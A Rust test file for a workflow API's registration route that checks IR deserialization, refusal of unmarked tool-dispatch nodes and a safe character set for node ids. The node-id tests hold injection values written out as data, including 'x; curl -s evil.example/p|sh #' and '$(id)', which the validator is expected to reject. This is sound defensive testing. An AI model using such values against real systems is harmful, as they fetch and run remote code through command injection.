//! Guards the `POST /workflows` IR deserialize-check.
//!
//! `create_workflow` rejects any IR that cannot load into the runtime's
//! `WorkflowIr` — otherwise a structurally-broken definition is stored happily
//! and only fails later when the scheduler tries to deserialize it, leaving the
//! execution stuck in `running` forever. These tests pin both directions: the
//! canonical compiled workflow must pass, and incomplete IR must be rejected.
//!
//! The route also runs ONE rule from `validate_workflow` — the ADK
//! tool-dispatch marker check — because an unmarked dispatch node is a
//! policy-enforcement hole rather than a reference the runtime resolves later.
//! The route-level tests at the bottom drive that through the real router.

use axum::body::Body;
use axum::http::{Request, StatusCode};
use jamjet_agents::InMemoryAgentRegistry;
use jamjet_api::{routes::build_router_with_opts, state::AppState};
use jamjet_audit::{AuditEnricher, NoopAuditBackend};
use jamjet_ir::WorkflowIr;
use jamjet_state::backend::StateBackend;
use jamjet_state::InMemoryBackend;
use serde_json::{json, Value};
use std::sync::Arc;
use tower::ServiceExt;

mod support;

#[test]
fn canonical_compiled_ir_deserializes() {
    // The exact IR produced by `jamjet init hello-agent` + the YAML compiler
    // (a `model` node whose `model_ref` is resolved by the worker registry, not
    // the IR `models` map — which is why the check is a shape check, not
    // `validate_workflow`'s stricter ref rules).
    let json = include_str!("fixtures/hello_agent_ir.json");
    let value: serde_json::Value = serde_json::from_str(json).expect("fixture is valid JSON");
    let ir = serde_json::from_value::<WorkflowIr>(value);
    assert!(
        ir.is_ok(),
        "compiled hello-agent IR must deserialize into WorkflowIr, else create_workflow \
         would 400 a valid `jamjet run` workflow: {:?}",
        ir.err()
    );
}

#[test]
fn structurally_broken_ir_is_rejected() {
    // Has the workflow_id/version the handler extracts, but none of the rest of
    // the IR — exactly the input the deserialize-check turns into a 400 instead
    // of a silent, never-scheduling execution.
    let value = serde_json::json!({ "workflow_id": "x", "version": "0.1.0" });
    assert!(
        serde_json::from_value::<WorkflowIr>(value).is_err(),
        "incomplete IR must not deserialize into WorkflowIr"
    );
}

#[test]
fn fleet_agent_ir_registers() {
    // A fleet agent that uses a catalog tool must still produce an IR the API
    // can store (POST /workflows deserializes into WorkflowIr). Regression for
    // the bug where catalog tool defs were embedded into the IR `tools` map
    // with a shape ToolConfig can't deserialize.
    let json = include_str!("fixtures/fleet_researcher_ir.json");
    let value: serde_json::Value = serde_json::from_str(json).expect("parse fixture json");
    let parsed = serde_json::from_value::<jamjet_ir::WorkflowIr>(value);
    assert!(
        parsed.is_ok(),
        "fleet researcher IR must deserialize into WorkflowIr, got: {:?}",
        parsed.err()
    );
}

// ── Route-level: the ADK tool-dispatch marker ────────────────────────────────
//
// Harness follows `claim_route_policy.rs` (in-process axum router over an
// `InMemoryBackend`, dev-mode so no auth).

const WF: &str = "adk-wf";
const VERSION: &str = "1.0.0";

fn make_state(backend: Arc<dyn StateBackend>) -> AppState {
    let backend_for_fn = backend.clone();
    let audit: Arc<dyn jamjet_audit::AuditBackend> = Arc::new(NoopAuditBackend);
    let enricher = Arc::new(AuditEnricher::new(Arc::clone(&audit)));
    AppState {
        backend: backend.clone(),
        backend_for_fn: Arc::new(move |_tenant_id: &jamjet_state::TenantId| backend_for_fn.clone()),
        agents: Arc::new(InMemoryAgentRegistry::new()),
        audit,
        enricher,
        protocols: jamjet_api::state::default_protocol_registry(),
        cron_store: None,
        approval_policy: Default::default(),
    }
}

/// A one-node IR whose node is the ADK tool-dispatch `python_fn`.
///
/// Built from raw JSON so the marker can be omitted ENTIRELY, which is how an
/// IR compiled by a pre-marker SDK arrives. Everything else about the IR is
/// valid and deserializes cleanly, so the marker rule is the only thing that
/// can reject it.
fn dispatch_ir(marker: Option<bool>) -> Value {
    let mut kind = json!({
        "type": "python_fn",
        "module": "jamjet.agents.tool_runtime",
        "function": "dispatch_tool_calls",
        "output_schema": ""
    });
    if let Some(m) = marker {
        kind["agent_tool_dispatch"] = json!(m);
    }
    json!({
        "workflow_id": WF,
        "version": VERSION,
        "state_schema": "{}",
        "start_node": "n1",
        "nodes": { "n1": { "id": "n1", "kind": kind } },
        "edges": [],
        "retry_policies": {},
        "models": {},
        "tools": {},
        "mcp_servers": {},
        "remote_agents": {}
    })
}

async fn post_workflow(state: &AppState, ir: Value) -> StatusCode {
    let body = json!({ "ir": ir });
    build_router_with_opts(state.clone(), true)
        .oneshot(
            Request::post("/workflows")
                .header("content-type", "application/json")
                .body(Body::from(serde_json::to_vec(&body).unwrap()))
                .unwrap(),
        )
        .await
        .unwrap()
        .status()
}

/// The version-skew case, driven through the real route: a pre-marker ADK IR
/// must be refused AND must not reach storage.
///
/// Storing it is the whole harm. Once the definition is persisted, every
/// execution of it hands a whole turn's model-chosen tool calls to the external
/// worker with no tool policy evaluated, and nothing downstream can recover the
/// marker that was never compiled in.
#[tokio::test]
async fn unmarked_adk_dispatch_ir_is_rejected_by_the_route() {
    let backend = Arc::new(InMemoryBackend::new());
    let state = make_state(backend.clone());

    let status = post_workflow(&state, dispatch_ir(None)).await;
    assert_eq!(
        status,
        StatusCode::BAD_REQUEST,
        "an unmarked ADK dispatch node must be refused at registration"
    );

    // The load-bearing assertion: refused AND not persisted.
    assert!(
        backend
            .get_workflow(WF, VERSION)
            .await
            .expect("backend lookup must succeed")
            .is_none(),
        "a refused IR must not be stored — a persisted definition runs its tool \
         calls unpoliced on every later execution"
    );
}

/// An explicit `false` is the same hole as an absent marker, and must be
/// refused identically. This is the case a pre-marker SDK cannot emit but a
/// hand-edited or replayed IR can.
#[tokio::test]
async fn explicitly_unmarked_adk_dispatch_ir_is_rejected_by_the_route() {
    let backend = Arc::new(InMemoryBackend::new());
    let state = make_state(backend.clone());

    let status = post_workflow(&state, dispatch_ir(Some(false))).await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
    assert!(backend
        .get_workflow(WF, VERSION)
        .await
        .expect("backend lookup must succeed")
        .is_none());
}

/// Narrowness: the IR Task 2's compiler actually emits still registers. Without
/// this, the rule above could be "reject every ADK workflow" and still pass.
#[tokio::test]
async fn marked_adk_dispatch_ir_registers() {
    let backend = Arc::new(InMemoryBackend::new());
    let state = make_state(backend.clone());

    let status = post_workflow(&state, dispatch_ir(Some(true))).await;
    assert_eq!(
        status,
        StatusCode::CREATED,
        "a correctly marked ADK dispatch IR must still register"
    );
    assert!(
        backend
            .get_workflow(WF, VERSION)
            .await
            .expect("backend lookup must succeed")
            .is_some(),
        "the accepted definition must be stored"
    );
}

/// Node ids are printed into commands a reviewer pastes (`jamjet approvals`
/// prints `jamjet approve ... --node-id <id>`), so they are restricted to
/// `[A-Za-z0-9_.-]{1,128}` at registration (round-4 review, I2).
#[tokio::test]
async fn a_node_id_outside_the_safe_set_is_refused() {
    use jamjet_state::backend::StateBackend;
    let backend: std::sync::Arc<dyn StateBackend> =
        std::sync::Arc::new(jamjet_state::InMemoryBackend::new());
    let state = support::make_state(backend);
    for (id, ok) in [
        ("x; curl -s evil.example/p|sh #", false),
        ("$(id)", false),
        ("a b", false),
        ("", false),
        (&*"n".repeat(129), false),
        ("fetch.v2-step_1", true),
        (&*"n".repeat(128), true),
    ] {
        let mut ir = support::python_fn_start_ir(&format!("wf-{}", ok as u8));
        let node = ir["nodes"]["py_start"].take();
        ir["nodes"] = serde_json::json!({ id: node });
        ir["nodes"][id]["id"] = serde_json::json!(id);
        ir["start_node"] = serde_json::json!(id);
        ir["edges"] = serde_json::json!([{ "from": id, "to": "end", "condition": null }]);
        ir["version"] = serde_json::json!(format!("0.1.{}", id.len()));
        let (st, body) = support::post(&state, "/workflows", serde_json::json!({ "ir": ir })).await;
        if ok {
            assert!(st.is_success(), "{id:?}: {st} {body}");
        } else {
            assert_eq!(st, axum::http::StatusCode::BAD_REQUEST, "{id:?}: {body}");
            assert!(body.to_string().contains("node id"), "{id:?}: {body}");
        }
    }
}

/// The map key and the node's `id` are both checked, and must agree: the key
/// routes the node, the `id` is what the approval basis shows.
#[tokio::test]
async fn a_node_id_must_be_safe_and_match_its_key() {
    use jamjet_state::backend::StateBackend;
    let backend: std::sync::Arc<dyn StateBackend> =
        std::sync::Arc::new(jamjet_state::InMemoryBackend::new());
    let state = support::make_state(backend);
    for (n, (key, id, needle)) in [
        ("ok", "x; curl -s evil.example/p|sh #", "node id"),
        ("ok", "other", "does not match"),
    ]
    .into_iter()
    .enumerate()
    {
        let mut ir = support::python_fn_start_ir(&format!("wf-key-{n}"));
        let mut node = ir["nodes"]["py_start"].take();
        node["id"] = serde_json::json!(id);
        ir["nodes"] = serde_json::json!({ key: node });
        ir["start_node"] = serde_json::json!(key);
        ir["edges"] = serde_json::json!([{ "from": key, "to": "end", "condition": null }]);
        let (st, body) = support::post(&state, "/workflows", serde_json::json!({ "ir": ir })).await;
        assert_eq!(
            st,
            axum::http::StatusCode::BAD_REQUEST,
            "{key}/{id}: {body}"
        );
        assert!(body.to_string().contains(needle), "{key}/{id}: {body}");
    }
}
